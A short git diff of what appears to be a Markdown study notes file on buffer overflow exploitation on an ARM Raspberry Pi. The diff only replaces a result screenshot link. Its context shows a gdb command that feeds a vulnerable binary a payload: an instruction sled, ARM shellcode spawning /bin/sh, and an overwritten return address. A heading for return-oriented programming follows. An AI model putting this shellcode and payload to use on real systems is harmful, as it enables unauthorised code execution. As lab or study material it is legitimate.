@@ -87,7 +87,7 @@ pi@korkeep:~/BOF $ gdb -q BOF
 (gdb) run $(python -c 'print "\x01\x10\xa0\xe1"*17+"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x03\xa0\x52\x40\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x2d\x1c\x2f\x62\x69\x6e\x2f\x73\x68\x58"+"AAAA"+"\x70\xf5\xff\x7e"')
 ```
 - **Result**  
-![image](https://user-images.githubusercontent.com/20378368/107657001-0f3f5580-6cc8-11eb-8ff5-fa81d2fabe03.png)  
+![image](https://user-images.githubusercontent.com/20378368/107658056-1dda3c80-6cc9-11eb-9173-69a569d9439f.png)  
 
 ## Return-Oriented Programming 🐱‍💻
 
